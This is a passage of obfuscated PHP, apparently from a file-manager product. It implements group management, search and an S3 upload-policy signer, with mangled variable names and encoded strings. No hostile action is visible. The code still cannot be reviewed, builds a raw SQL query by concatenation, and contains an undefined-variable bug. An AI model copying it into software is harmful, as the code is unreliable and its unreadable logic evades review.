$this->parentLevelArray($à‡¯Š®È[$àğ¢å½ƒ[584]]); } else { } $ŠÌÇã [] = $à‡¯Š®È[$àğ¢å½ƒ[1971]]; $ÏÆå‘µÀ = array(); foreach ($ŠÌÇã  as $ ê‹­¾Ù) { $ÏÆå‘µÀ[] = array($àğ¢å½ƒ[1971] => $ ê‹­¾Ù, $àğ¢å½ƒ[97] => $àğ¢å½ƒ[823], $àğ¢å½ƒ[450] => $«œ®Ş¸ú); $this->_clearCache($ ê‹­¾Ù); } return Model($àğ¢å½ƒ[2064])->addAll($ÏÆå‘µÀ, array(), !0); } protected function groupRemove($ÄğÉâë, $ŞÂõ–£õ = false) { $åÅüœ› =& $_SERVER[¦»×‡Ãã]; $£ş«¬ì® = array($åÅüœ›[1971] => $ÄğÉâë); $ä÷ïŒŸ´ = $this->where($£ş«¬ì®)->find(); if (!$ä÷ïŒŸ´ || $ä÷ïŒŸ´[$åÅüœ›[192]] == 0) { return !1; } if (!$ŞÂõ–£õ) { $É‰‚õŞ = $this->getInfoSimple($ä÷ïŒŸ´[$åÅüœ›[192]]); $this->_changeChildLevel($ä÷ïŒŸ´, $É‰‚õŞ, !0); $this->where(array($åÅüœ›[192] => $ÄğÉâë))->save(array($åÅüœ›[192] => $ä÷ïŒŸ´[$åÅüœ›[192]])); $this->_clearCache($É‰‚õŞ[$åÅüœ›[1971]]); } Model($åÅüœ›[2064])->where($£ş«¬ì®)->delete(); Model($åÅüœ›[2065])->where($£ş«¬ì®)->delete(); Model($åÅüœ›[897])->groupRootRemove($ÄğÉâë); $this->_clearCache($ä÷ïŒŸ´[$åÅüœ›[192]]); return $this->where($£ş«¬ì®)->delete(); } protected function groupSort($Œ³°’–) { $§ĞøÊÀû =& $_SERVER[¦»×‡Ãã]; $ÜÈ‚¿Äö = array(); foreach ($Œ³°’– as $³©ößÂ– => $ì®ìÚØ) { $ÜÈ‚¿Äö[] = array($§ĞøÊÀû[1971], $ì®ìÚØ, $§ĞøÊÀû[1995], $³©ößÂ– + 1); } $this->saveAll($ÜÈ‚¿Äö); } public function listData() { $î¹ÖÏÇŠ = $this->_makeOrder()->selectPage(50); $this->_listDataApply($î¹ÖÏÇŠ[$_SERVER[¦»×‡Ãã][445]]); return $î¹ÖÏÇŠ; } private function _makeOrder($Ëø¶Œñ = '') { $’œİˆ‹Á =& $_SERVER[¦»×‡Ãã]; $¾Æì˜²ë = array($’œİˆ‹Á[1971], $’œİˆ‹Á[32], $’œİˆ‹Á[1959], $’œİˆ‹Á[231]); $›¨§½ò¿ = array($’œİˆ‹Á[523] => $’œİˆ‹Á[524], $’œİˆ‹Á[525] => $’œİˆ‹Á[526]); $Üš™’ = Input::get($’œİˆ‹Á[530], $’œİˆ‹Á[7], $’œİˆ‹Á[1975], $¾Æì˜²ë); $‚¾ÙÁ·¹ = Input::get($’œİˆ‹Á[531], $’œİˆ‹Á[7], $’œİˆ‹Á[2066], array($’œİˆ‹Á[2066], $’œİˆ‹Á[525])); $‚¾ÙÁ·¹ = $›¨§½ò¿[$‚¾ÙÁ·¹]; $Ëø¶Œñ = $Ëø¶Œñ . "{$Üš™’}\x20{$‚¾ÙÁ·¹}\x2c\40\147\162\157\165\x70\111\104\40\x61\163\143"; return $this->order($Ëø¶Œñ); } public function listChild($†îŞ‡Ôà) { $²¿ÃÉ›ô =& $_SERVER[¦»×‡Ãã]; $ñÈ¬ƒß = $this->where(array($²¿ÃÉ›ô[192] => $†îŞ‡Ôà))->_makeOrder()->selectPage(200); $this->_listDataApply($ñÈ¬ƒß[$²¿ÃÉ›ô[445]]); return $ñÈ¬ƒß; } public function listChildIds($ü² ³ƒó) { $İ·ºËš =& $_SERVER[¦»×‡Ãã]; if (is_string($£Í†Ñ¬Ã)) { $ü² ³ƒó = explode($İ·ºËš[50], $ü² ³ƒó); } $·³Í¿å¶ = $this->where(array($İ·ºËš[1971] => array($İ·ºËš[7], $ü² ³ƒó)))->field($İ·ºËš[2067])->select(); if (!$·³Í¿å¶) { return !1; } $òØˆÎí = array(); foreach ($·³Í¿å¶ as $µ™Ÿ©Ü×) { $òØˆÎí[] = "\x73\x65\x6c\145\x63\164\40\147\162\x6f\165\x70\x49\104\x20\146\x72\157\x6d\40\140\x67\162\x6f\165\x70\140\x20\167\150\x65\x72\x65\40\x70\x61\x72\x65\156\164\x4c\x65\x76\145\154\40\x6c\151\x6b\x65\x20\47{$µ™Ÿ©Ü×[$İ·ºËš[584]]}{$µ™Ÿ©Ü×[$İ·ºËš[1971]]}\x2c\45\x27"; } $òØˆÎí = implode($İ·ºËš[2068], $òØˆÎí); $·³Í¿å¶ = $this->query($òØˆÎí); if (!$·³Í¿å¶) { return array(); } $ü² ³ƒó = array_to_keyvalue($·³Í¿å¶, $İ·ºËš[12], $İ·ºËš[1971]); return array_unique($ü² ³ƒó); } public function listByID($ëøûŞº) { $ï§ËŒşœ =& $_SERVER[¦»×‡Ãã]; if (!$ëøûŞº) { return array(); } $ëƒ²ö£¶ = array($ï§ËŒşœ[1971] => array($ï§ËŒşœ[7], $ëøûŞº)); $°º®–£« = $this->where($ëƒ²ö£¶)->select(); $°º®–£« = array_sort_keep($°º®–£«, $ï§ËŒşœ[1971], $ëøûŞº); $this->_listDataApply($°º®–£«); return $°º®–£«; } public function listSearch($Èì¥µˆ«) { $¿öˆé÷Ñ =& $_SERVER[¦»×‡Ãã]; $Šï«­ºù = trim($Èì¥µˆ«[$¿öˆé÷Ñ[2069]]); $‰€Ú¼Ææ = explode($¿öˆé÷Ñ[53], $Šï«­ºù); if (!$Šï«­ºù || count($‰€Ú¼Ææ) == 1) { return $this->listSearchNow($Èì¥µˆ«); } $€‘Œ¼Œ‡ = array($¿öˆé÷Ñ[445] => array()); foreach ($‰€Ú¼Ææ as $”€‚º«ş) { if (!trim($”€‚º«ş)) { continue; } $Èì¥µˆ«[$¿öˆé÷Ñ[2069]] = $”€‚º«ş; $ï ŞßŞ  = $this->listSearchNow($Èì¥µˆ«); $€‘Œ¼Œ‡[$¿öˆé÷Ñ[445]] = array_merge($€‘Œ¼Œ‡[$¿öˆé÷Ñ[445]], $ï ŞßŞ [$¿öˆé÷Ñ[445]]); } $€‘Œ¼Œ‡[$¿öˆé÷Ñ[445]] = array_unique_by_key($€‘Œ¼Œ‡[$¿öˆé÷Ñ[445]], $¿öˆé÷Ñ[1971]); $€‘Œ¼Œ‡[$¿öˆé÷Ñ[442]] = array($¿öˆé÷Ñ[443] => count($€‘Œ¼Œ‡[$¿öˆé÷Ñ[445]]), $¿öˆé÷Ñ[439] => 20, $¿öˆé÷Ñ[429] => 1, $¿öˆé÷Ñ[444] => 1); return $€‘Œ¼Œ‡; } public function listSearchNow($õÇŒĞÃ‘) { $ÖÂ©ğ×Ö =& $_SERVER[¦»×‡Ãã]; $¨°à£İÀ = trim($õÇŒĞÃ‘[$ÖÂ©ğ×Ö[2069]]); $ïïå·À = isset($õÇŒĞÃ‘[$ÖÂ©ğ×Ö[2070]]) ? $õÇŒĞÃ‘[$ÖÂ©ğ×Ö[2070]] : !1; if (!trim($¨°à£İÀ)) { return !1; } $¨°à£İÀ = str_replace($ÖÂ©ğ×Ö[2071], $ÖÂ©ğ×Ö[2072], $¨°à£İÀ); $©¯ÖÔº– = array($ÖÂ©ğ×Ö[1971] => array($ÖÂ©ğ×Ö[459], "{$¨°à£İÀ}\x25"), $ÖÂ©ğ×Ö[32] => array($ÖÂ©ğ×Ö[459], "\x25{$¨°à£İÀ}\x25"), $ÖÂ©ğ×Ö[1078] => $ÖÂ©ğ×Ö[2073]); if ($ïïå·À) { $ŒÆ–°ö¯ = $this->getInfoSimple($ïïå·À); $Â•—ò´À = $ŒÆ–°ö¯[$ÖÂ©ğ×Ö[584]] . $ïïå·À . $ÖÂ©ğ×Ö[613]; $©¯ÖÔº– = array($©¯ÖÔº–, array($ÖÂ©ğ×Ö[584] => array($ÖÂ©ğ×Ö[459], $Â•—ò´À))); } $©¯ÖÔº– = $this->parseWhereLike($©¯ÖÔº–); $ÙíŒÀº = $this->_makeOrder()->where($©¯ÖÔº–)->selectPage(20); $ÙíŒÀº = $ÙíŒÀº ? $ÙíŒÀº : array($ÖÂ©ğ×Ö[445] => array(), $ÖÂ©ğ×Ö[442] => array()); if (!$ÙíŒÀº || count($ÙíŒÀº[$ÖÂ©ğ×Ö[445]]) < 5 && Input::check($¨°à£İÀ, $ÖÂ©ğ×Ö[394])) { $áÇæØÇ³ = $this->groupChildrenAll($ïïå·À); $Ô„çÇ‡ì = $this->_searchFromMeta($ÖÂ©ğ×Ö[537], $¨°à£İÀ, 10, $áÇæØÇ³); $Íç“µ˜‡ = $this->_searchFromMeta($ÖÂ©ğ×Ö[538], $¨°à£İÀ, 10, $áÇæØÇ³); $‡°òºÌï = array_merge($Ô„çÇ‡ì, $Íç“µ˜‡, $ÙíŒÀº[$ÖÂ©ğ×Ö[445]]); $ÙíŒÀº[$ÖÂ©ğ×Ö[445]] = array_unique_by_key($‡°òºÌï, $ÖÂ©ğ×Ö[1971]); $ÙíŒÀº[$ÖÂ©ğ×Ö[442]][$ÖÂ©ğ×Ö[443]] = count($ÙíŒÀº[$ÖÂ©ğ×Ö[445]]); $ÙíŒÀº[$ÖÂ©ğ×Ö[442]][$ÖÂ©ğ×Ö[444]] = ceil($ÙíŒÀº[$ÖÂ©ğ×Ö[442]][$ÖÂ©ğ×Ö[443]] / $ÙíŒÀº[$ÖÂ©ğ×Ö[442]][$ÖÂ©ğ×Ö[439]]); } $this->_listDataApply($ÙíŒÀº[$ÖÂ©ğ×Ö[445]]); return $ÙíŒÀº; } protected function groupChildrenAll($§¼–’‹¯) { $”¦¡à =& $_SERVER[¦»×‡Ãã]; if (!$§¼–’‹¯) { return !1; } if (!is_array($§¼–’‹¯)) { $§¼–’‹¯ = array($§¼–’‹¯); } $´ş™¦³ = $§¼–’‹¯; foreach ($§¼–’‹¯ as $ºŠŸÈ¸ß) { $É§İ¬¾Ù = $this->getInfoSimple($ºŠŸÈ¸ß); $’Ê‹º§Ğ = array($”¦¡à[584] => array($”¦¡à[459], $É§İ¬¾Ù[$”¦¡à[584]] . $ºŠŸÈ¸ß . $”¦¡à[613])); $Æ¬¶ş² = $this->field($”¦¡à[1971])->where($’Ê‹º§Ğ)->select(); $´ş™¦³ = array_merge($´ş™¦³, array_to_keyvalue($Æ¬¶ş², $”¦¡à[12], $”¦¡à[1971])); } return array_unique($´ş™¦³); } private function _searchFromMeta($è°ãÑÍ, $ù×­ï¥ü, $Éöâ œ, $À‰Õ¶À) { $“ş¥ıõÖ =& $_SERVER[¦»×‡Ãã]; $ù×­ï¥ü = strtolower($ù×­ï¥ü); $»‚ŒòÏş = array($“ş¥ıõÖ[97] => $è°ãÑÍ, $“ş¥ıõÖ[450] => array($“ş¥ıõÖ[459], "\x25{$ù×­ï¥ü}\45")); $»‚ŒòÏş = $this->parseWhereLike($»‚ŒòÏş); if ($À‰Õ¶À) { $»‚ŒòÏş[$“ş¥ıõÖ[1971]] = array($“ş¥ıõÖ[7], $À‰Õ¶À); } $øÂû³½å = Model($“ş¥ıõÖ[2074])->where($»‚ŒòÏş)->limit($Éöâ œ)->select(); if (!$øÂû³½å) { return array(); } $øÂû³½å = array_to_keyvalue($øÂû³½å, $“ş¥ıõÖ[12], $“ş¥ıõÖ[1971]); $ó¹Ò = $this->where(array($“ş¥ıõÖ[2063] => array($“ş¥ıõÖ[7], $øÂû³½å)))->select(); if (!$ó¹Ò) { return array(); } return $ó¹Ò; } protected function _listDataApplyItem($ó‚ù·¨) { $İˆ²¨ıË = array($ó‚ù·¨); $this->_listDataApply($İˆ²¨ıË); return $İˆ²¨ıË[0]; } protected function _listDataApply(&$Ù–øÁêŠ) { $öïíşÇ‡ =& $_SERVER[¦»×‡Ãã]; if (!$Ù–øÁêŠ) { return; } $¿«´¤ú§ = array_to_keyvalue($Ù–øÁêŠ, $öïíşÇ‡[12], $öïíşÇ‡[1971]); $this->_listAppendChildren($Ù–øÁêŠ); $this->_listAppendChildrenMember($Ù–øÁêŠ); $this->_listAppendMeta($Ù–øÁêŠ, $¿«´¤ú§); $this->_listAppendParent($Ù–øÁêŠ); $this->_listAppendSourceRoot($Ù–øÁêŠ, $¿«´¤ú§); } private function _listAppendChildren(&$…ÄÛÒ) { $”í¡»—Ş =& $_SERVER[¦»×‡Ãã]; $Ü«ÖÇß› = array_to_keyvalue($…ÄÛÒ, $”í¡»—Ş[12], $”í¡»—Ş[1971]); $İ¨é«ÌÂ = array($”í¡»—Ş[192] => array($”í¡»—Ş[7], $Ü«ÖÇß›)); $«†ÇÏØ = array($”í¡»—Ş[192], $”í¡»—Ş[2075] => $”í¡»—Ş[565]); $öŒš½Š = $this->field($«†ÇÏØ)->where($İ¨é«ÌÂ)->group($”í¡»—Ş[192])->select(); $…ÖÍ¸£³ = array_to_keyvalue($öŒš½Š, $”í¡»—Ş[192], $”í¡»—Ş[565]); foreach ($…ÄÛÒ as &$™™Ş†Çç) { $ğ›Áóö = $™™Ş†Çç[$”í¡»—Ş[1971]]; $™™Ş†Çç[$”í¡»—Ş[2076]] = isset($…ÖÍ¸£³[$ğ›Áóö]) ? intval($…ÖÍ¸£³[$ğ›Áóö]) : !1; } unset($™™Ş†Çç); } private function _listAppendChildrenMember(&$›øÃ¢›§) { $¸íÏ×˜Ê =& $_SERVER[¦»×‡Ãã]; $´Ì§Šèœ = array_to_keyvalue($›øÃ¢›§, $¸íÏ×˜Ê[12], $¸íÏ×˜Ê[1971]); $ı±«†÷Ò = array($¸íÏ×˜Ê[1971] => array($¸íÏ×˜Ê[7], $´Ì§Šèœ)); $¦ÂšÆÉç = array($¸íÏ×˜Ê[1971], $¸íÏ×˜Ê[2075] => $¸íÏ×˜Ê[565]); $Õ¹¯‰Ñ¾ = Model($¸íÏ×˜Ê[2065])->field($¦ÂšÆÉç)->where($ı±«†÷Ò)->group($¸íÏ×˜Ê[1971])->select(); $¯¹îæè = array_to_keyvalue($Õ¹¯‰Ñ¾, $¸íÏ×˜Ê[1971], $¸íÏ×˜Ê[565]); foreach ($›øÃ¢›§ as &$ÑÅµßåß) { $ËŸÚ¥üÀ = $ÑÅµßåß[$¸íÏ×˜Ê[1971]]; $ÑÅµßåß[$¸íÏ×˜Ê[2077]] = isset($¯¹îæè[$ËŸÚ¥üÀ]) ? intval($¯¹îæè[$ËŸÚ¥üÀ]) : !1; } unset($ÑÅµßåß); } private function _listAppendMeta(&$Ôó¾ì±Ã, $ãì©á•–) { $óö‹ºÔ“ =& $_SERVER[¦»×‡Ãã]; $Ö´ı©—› = array($óö‹ºÔ“[1971] => array($óö‹ºÔ“[7], $ãì©á•–)); $¢ü±¨Á¤ = Model($óö‹ºÔ“[2064])->where($Ö´ı©—›)->select(); $¢ü±¨Á¤ = array_to_keyvalue_group($¢ü±¨Á¤, $óö‹ºÔ“[1971]); foreach ($¢ü±¨Á¤ as &$âÀæıÓÃ) { $âÀæıÓÃ = array_to_keyvalue($âÀæıÓÃ, $óö‹ºÔ“[97], $óö‹ºÔ“[450]); } unset($âÀæıÓÃ); foreach ($Ôó¾ì±Ã as &$©š¾ëÕ®) { $©š¾ëÕ®[$óö‹ºÔ“[539]] = array(); if (isset($¢ü±¨Á¤[$©š¾ëÕ®[$óö‹ºÔ“[1971]]])) { $©š¾ëÕ®[$óö‹ºÔ“[539]] = $¢ü±¨Á¤[$©š¾ëÕ®[$óö‹ºÔ“[1971]]]; } } unset($©š¾ëÕ®); } protected function parentLevelArray($Ğü×¢ä±) { $Ñ•ô¾Û€ =& $_SERVER[¦»×‡Ãã]; $Ğü×¢ä± = explode($Ñ•ô¾Û€[50], trim($Ğü×¢ä±, $Ñ•ô¾Û€[50])); $Ğü×¢ä± = array_remove_value($Ğü×¢ä±, $Ñ•ô¾Û€[228]); return $Ğü×¢ä±; } protected function parentInGroup($ôàÑš³, $’§µÔŞù) { $İ°¹Ñ¢ =& $_SERVER[¦»×‡Ãã]; $ô§¿»»• = $this->getInfoSimple($ôàÑš³); if (!$ô§¿»»•) { return !0; } $¬Şş»Ëß = $this->parentLevelArray($ô§¿»»•[$İ°¹Ñ¢[584]]); $¬Şş»Ëß[] = $ôàÑš³; foreach ($¬Şş»Ëß as $ôàÑš³) { if (in_array($ôàÑš³ . $İ°¹Ñ¢[12], $’§µÔŞù)) { return !0; } } return !1; } private function _listAppendParent(&$»éº„œ) { $ãâïäñØ =& $_SERVER[¦»×‡Ãã]; $¯Ã£ÒÄï = array(); foreach ($»éº„œ as &$ûü––¯Â) { $¯Ã£ÒÄï[$ûü––¯Â[$ãâïäñØ[1971]]] = $ûü––¯Â[$ãâïäñØ[32]]; $Ó¢ÅÅ›¸ = $this->parentLevelArray($ûü––¯Â[$ãâïäñØ[584]]); foreach ($Ó¢ÅÅ›¸ as $ë¥ö†©¹) { if (!isset($¯Ã£ÒÄï[$ë¥ö†©¹])) { $¯Ã£ÒÄï[$ë¥ö†©¹] = 0; } } } unset($ûü––¯Â); foreach ($¯Ã£ÒÄï as $éùçœŞ´ => $áæ©Æ¾™) { if ($áæ©Æ¾™) { continue; } $Ç½°ï© = $this->getInfoSimple($éùçœŞ´); $¯Ã£ÒÄï[$éùçœŞ´] = $Ç½°ï©[$ãâïäñØ[32]]; } $Í»ïáìˆ = $GLOBALS[$ãâïäñØ[6]][$ãâïäñØ[92]][$ãâïäñØ[2078]]; if (KodUser::isRoot()) { $Í»ïáìˆ = !1; } foreach ($»éº„œ as &$ûü––¯Â) { $Ó¢ÅÅ›¸ = $this->parentLevelArray($ûü––¯Â[$ãâïäñØ[584]]); $ŸäËÀÎ• = $ãâïäñØ[12]; foreach ($Ó¢ÅÅ›¸ as $éùçœŞ´ => $ë¥ö†©¹) { if ($Í»ïáìˆ && $éùçœŞ´ == 0) { continue; } $ŸäËÀÎ• .= $¯Ã£ÒÄï[$ë¥ö†©¹] . $ãâïäñØ[8]; } if ($Ó¢ÅÅ›¸) { $ŸäËÀÎ• .= $ûü––¯Â[$ãâïäñØ[32]]; } $ûü––¯Â[$ãâïäñØ[589]] = str_replace($ãâïäñØ[592], $ãâïäñØ[8], $ŸäËÀÎ•); } unset($ûü––¯Â); } private function _listAppendSourceRoot(&$ùÒØŸÜ©, $Ÿšï«¼ã) { $¡ƒáÒàª =& $_SERVER[¦»×‡Ãã]; $Ô¿ Œ¨— = Model($¡ƒáÒàª[897])->listSourceRoot(SourceModel::TYPE_GROUP, $Ÿšï«¼ã); $Ô¿ Œ¨— = array_to_keyvalue($Ô¿ Œ¨—, $¡ƒáÒàª[569]); $Ô¿ Œ¨— = array_remove_key($Ô¿ Œ¨—, $¡ƒáÒàª[569]); foreach ($ùÒØŸÜ© as &$èóö¥Ê) { $èóö¥Ê[$¡ƒáÒàª[90]] = $Ô¿ Œ¨—[$èóö¥Ê[$¡ƒáÒàª[1971]]] ? $Ô¿ Œ¨—[$èóö¥Ê[$¡ƒáÒàª[1971]]] : array(); } unset($èóö¥Ê); } protected function groupMerge($šŞŒÖû¿) { $šŞŒÖû¿ = array_values(array_unique($šŞŒÖû¿)); $œ­ÄûŒµ = array(); for ($–›¦øı¾ = 0; $–›¦øı¾ < count($šŞŒÖû¿); $–›¦øı¾++) { $²—ÆåÊ = !1; for ($òŸ¦¼©¼ = 0; $òŸ¦¼©¼ < count($šŞŒÖû¿); $òŸ¦¼©¼++) { if ($–›¦øı¾ == $òŸ¦¼©¼) { continue; } if ($this->isParentOf($šŞŒÖû¿[$òŸ¦¼©¼], $šŞŒÖû¿[$–›¦øı¾])) { $²—ÆåÊ = !0; break; } } if (!$²—ÆåÊ) { $œ­ÄûŒµ[] = $šŞŒÖû¿[$–›¦øı¾]; } } return $œ­ÄûŒµ; } protected function isParentOf($ÈÍù²†Æ, $äë¸ï›ï) { $ÖáÅşÅç =& $_SERVER[¦»×‡Ãã]; if (!$ÈÍù²†Æ || !$äë¸ï›ï || $ÈÍù²†Æ == $äë¸ï›ï) { return !1; } $äŠÀç÷ = $this->getInfoSimple($ÈÍù²†Æ); $š¾òµµÊ = $this->getInfoSimple($äë¸ï›ï); $××ª¬µª = $äŠÀç÷[$ÖáÅşÅç[584]] . $ÈÍù²†Æ . $ÖáÅşÅç[50]; if (substr($š¾òµµÊ[$ÖáÅşÅç[584]], 0, strlen($××ª¬µª)) == $××ª¬µª) { return !0; } return !1; } public function groupShowRoot($»ï×•Û , $Éµ£îè÷ = false) { $ó£·ß½Ó =& $_SERVER[¦»×‡Ãã]; $‰˜å­¶• = $this->getInfo($»ï×•Û ); if (!$‰˜å­¶•) { return array(); } $Ô’“é€ï = $this->parentLevelArray($‰˜å­¶•[$ó£·ß½Ó[584]]); $“Éš³‹ = array($»ï×•Û ); if (count($Ô’“é€ï) == 0) { return $“Éš³‹; } if ($Éµ£îè÷ && count($Ô’“é€ï) == 1) { return $“Éš³‹; } if (!$‰˜å­¶•[$ó£·ß½Ó[539]] || !isset($‰˜å­¶•[$ó£·ß½Ó[539]][$ó£·ß½Ó[2061]]) || $‰˜å­¶•[$ó£·ß½Ó[539]][$ó£·ß½Ó[2061]] == $ó£·ß½Ó[849]) { return $this->groupShowRoot($Ô’“é€ï[count($Ô’“é€ï) - 1], $Éµ£îè÷); } if ($‰˜å­¶•[$ó£·ß½Ó[539]][$ó£·ß½Ó[2061]] == $ó£·ß½Ó[433]) { $Á¬Í¦½™ = explode($ó£·ß½Ó[50], $‰˜å­¶•[$ó£·ß½Ó[539]][$ó£·ß½Ó[2062]]); if ($Á¬Í¦½™) { $“Éš³‹ = array_merge($“Éš³‹, $Á¬Í¦½™); } } return $“Éš³‹; } protected function resetParentLevel() { $ö©¤İ“ =& $_SERVER[¦»×‡Ãã]; $à­†Ğù™ = $ö©¤İ“[1971]; $¿âÜù¥ú = $this->select(); $¿âÜù¥ú = array_to_keyvalue($¿âÜù¥ú, $à­†Ğù™); foreach ($¿âÜù¥ú as $¢À±£‰Ê) { $ÀÖÊ„”à = $¢À±£‰Ê; $ìÁ·à¬ = array(); while ($ÀÖÊ„”à[$ö©¤İ“[192]] != 0) { $ìÁ·à¬[] = $ÀÖÊ„”à[$ö©¤İ“[192]]; $ÀÖÊ„”à = $¿âÜù¥ú[$ÀÖÊ„”à[$ö©¤İ“[192]]]; } $ìÁ·à¬[] = 0; $ìÁ·à¬ = $ö©¤İ“[50] . implode($ö©¤İ“[50], array_reverse($ìÁ·à¬)) . $ö©¤İ“[50]; $this->setNamePinyin($¢À±£‰Ê[$à­†Ğù™], $¢À±£‰Ê[$ö©¤İ“[32]]); $this->where(array($à­†Ğù™ => $¢À±£‰Ê[$à­†Ğù™]))->save(array($ö©¤İ“[652] => $ìÁ·à¬)); } return $¿âÜù¥ú; } public function groupNameAuto($ığß¥Ûû, $‰¸ß·ˆ») { $ò¿šıÇ¦ =& $_SERVER[¦»×‡Ãã]; $Øä‡°İ = $this->where(array($ò¿šıÇ¦[477] => $ığß¥Ûû))->getField($ò¿šıÇ¦[32], !0); if (!$Øä‡°İ || !in_array($‰¸ß·ˆ», $Øä‡°İ)) { return $‰¸ß·ˆ»; } for ($©€úè—¤ = 1; $©€úè—¤ <= count($Øä‡°İ) + 1; $©€úè—¤++) { $Î¼ÏåØÉ = $‰¸ß·ˆ» . "\50{$©€úè—¤}\x29"; if (!in_array($Î¼ÏåØÉ, $Øä‡°İ)) { return $Î¼ÏåØÉ; } } } public function groupSwitch($éâ‘ğÊÂ, $€şëùíŒ) { $Êªì¥È¹ =& $_SERVER[¦»×‡Ãã]; $Û”‚İÎ± = array($Êªì¥È¹[1971] => array($Êªì¥È¹[7], array($éâ‘ğÊÂ, $€şëùíŒ))); $€Àƒñ„ = $this->where($Û”‚İÎ±)->select(); $€Àƒñ„ = array_to_keyvalue($€Àƒñ„, $Êªì¥È¹[1971]); if (!isset($€Àƒñ„[$éâ‘ğÊÂ]) || !isset($€Àƒñ„[$€şëùíŒ]) || $€Àƒñ„[$éâ‘ğÊÂ][$Êªì¥È¹[192]] == 0) { return !1; } $Û”‚İÎ± = array($Êªì¥È¹[1971] => $éâ‘ğÊÂ); $Ó…ÇÊ¤ = Model($Êªì¥È¹[2065])->where($Û”‚İÎ±)->select(); if (!$Ó…ÇÊ¤) { $Ó…ÇÊ¤ = array(); } foreach ($Ó…ÇÊ¤ as $½Ú‚îìè) { $µá¥ª›‰ = $½Ú‚îìè[$Êªì¥È¹[1772]]; $Û”‚İÎ± = array($Êªì¥È¹[1772] => $µá¥ª›‰, $Êªì¥È¹[1971] => $€şëùíŒ); $•ìÇÉ‰ğ = Model($Êªì¥È¹[2065])->where($Û”‚İÎ±)->find(); if (!$•ìÇÉ‰ğ) { $¯ÈäÒàÏ = array($€şëùíŒ => $½Ú‚îìè[$Êªì¥È¹[2079]]); Model($Êªì¥È¹[598])->userGroupAdd($µá¥ª›‰, $¯ÈäÒàÏ); } Model($Êªì¥È¹[598])->userGroupRemove($µá¥ª›‰, $éâ‘ğÊÂ); } $Û”‚İÎ± = array($Êªì¥È¹[190] => 2, $Êªì¥È¹[192] => 0, $Êªì¥È¹[485] => 1, $Êªì¥È¹[569] => array($Êªì¥È¹[7], array($éâ‘ğÊÂ, $€şëùíŒ))); $ôüßÁ£ = Model($Êªì¥È¹[897])->where($Û”‚İÎ±)->field($Êªì¥È¹[2080])->select(); $ôüßÁ£ = array_to_keyvalue($ôüßÁ£, $Êªì¥È¹[569], $Êªì¥È¹[193]); $ÓÆà¶©÷ = !empty($ôüßÁ£[$éâ‘ğÊÂ]) ? $ôüßÁ£[$éâ‘ğÊÂ] : !1; if ($ÓÆà¶©÷) { if (!$ôüßÁ£[$€şëùíŒ]) { $ôüßÁ£[$€şëùíŒ] = Model($Êªì¥È¹[897])->groupRootAdd($€şëùíŒ); } $õ÷ÀÛÒŞ = $ôüßÁ£[$€şëùíŒ]; $Û”‚İÎ± = array($Êªì¥È¹[192] => $ÓÆà¶©÷); $ôüßÁ£ = Model($Êªì¥È¹[897])->where($Û”‚İÎ±)->field($Êªì¥È¹[2081])->select(); if (!$ôüßÁ£) { $ôüßÁ£ = array(); } Model($Êªì¥È¹[897])->moveClearAuth = !1; foreach ($ôüßÁ£ as $±³Óç´ò) { $²‡¥Úù¹ = $±³Óç´ò[$Êªì¥È¹[485]] == $Êªì¥È¹[91] ? REPEAT_RENAME_FOLDER : REPEAT_RENAME; Model($Êªì¥È¹[897])->move($±³Óç´ò[$Êªì¥È¹[193]], $õ÷ÀÛÒŞ, $²‡¥Úù¹); } Model($Êªì¥È¹[897])->moveClearAuth = !0; $Û”‚İÎ± = array($Êªì¥È¹[190] => 2, $Êªì¥È¹[569] => $éâ‘ğÊÂ); $ßù€‡É = array($Êªì¥È¹[569] => $€şëùíŒ); Model($Êªì¥È¹[2082])->where($Û”‚İÎ±)->save($ßù€‡É); Model($Êªì¥È¹[2083])->where($Û”‚İÎ±)->save($ßù€‡É); } $this->_changeChildLevel($€Àƒñ„[$éâ‘ğÊÂ], $€Àƒñ„[$€şëùíŒ], !0); $this->where(array($Êªì¥È¹[192] => $éâ‘ğÊÂ))->save(array($Êªì¥È¹[192] => $€şëùíŒ)); $this->_clearChildrenCache($€Àƒñ„[$€şëùíŒ]); return !0; } } goto dÁŸ‚»Îáç; eÜ¼½èÑÌ: class PathDriverS3 extends PathDriverBaseS3 { public function __construct($Æô®Ôª) { parent::__construct($Æô®Ôª); } public function uploadFormData($£®Ù˜°, $ÒÂõõË™ = 3600) { $…€€ÒÒ =& $_SERVER[¦»×‡Ãã]; $ö‰«Î = $…€€ÒÒ[229]; $×ñÃü¦ = $…€€ÒÒ[270]; $¢¢²‡Æš = $…€€ÒÒ[62]; $ñ¸òÓ… = gmdate($…€€ÒÒ[271]); $ãŒ¾µ‹ƒ = gmdate($…€€ÒÒ[272]); $€Õé³‡ = $…€€ÒÒ[273]; $´á¨ñœ = $ÒÂõõË™ . $…€€ÒÒ[12]; $›Œãœƒ = $…€€ÒÒ[274]; $Ö…ĞóÏ  = array($this->accessKey, $ãŒ¾µ‹ƒ, $this->region, $¢¢²‡Æš, $€Õé³‡); $áõ™îŸ = implode($…€€ÒÒ[8], $Ö…ĞóÏ ); $éŞ™‰ = array($…€€ÒÒ[275] => gmdate($…€€ÒÒ[299], strtotime($…€€ÒÒ[277])), $…€€ÒÒ[278] => array(array($…€€ÒÒ[279] => $this->bucket), array($…€€ÒÒ[280] => $ö‰«Î), array($…€€ÒÒ[281], $…€€ÒÒ[282], $…€€ÒÒ[12]), array($…€€ÒÒ[281], $…€€ÒÒ[283], $…€€ÒÒ[12]), array($…€€ÒÒ[281], $…€€ÒÒ[284], $…€€ÒÒ[12]), array($…€€ÒÒ[285] => $›Œãœƒ), array($…€€ÒÒ[286] => $áõ™îŸ), array($…€€ÒÒ[287] => $×ñÃü¦), array($…€€ÒÒ[288] => $ñ¸òÓ…), array($…€€ÒÒ[289] => $´á¨ñœ))); $á‹ğ¥¿ë = base64_encode(json_encode($éŞ™‰)); $óÆ¯¤—… = hash_hmac($…€€ÒÒ[290], $ãŒ¾µ‹ƒ, $…€€ÒÒ[291] . $this->secret, !0); $½ ¬ÁÕ— = hash_hmac($…€€ÒÒ[290], $this->region, $óÆ¯¤—…, !0); $ÙÅ˜ÀË¤ = hash_hmac($…€€ÒÒ[290], $¢¢²‡Æš, $½ ¬ÁÕ—, !0); $š ûô± = hash_hmac($…€€ÒÒ[290], $€Õé³‡, $ÙÅ˜ÀË¤, !0); $­êô­‹– = hash_hmac($…€€ÒÒ[290], $á‹ğ¥¿ë, $š ûô±); $Ó˜ÉĞëˆ = array($…€€ÒÒ[246] => $…€€ÒÒ[12], $…€€ÒÒ[292] => $…€€ÒÒ[12], $…€€ÒÒ[280] => 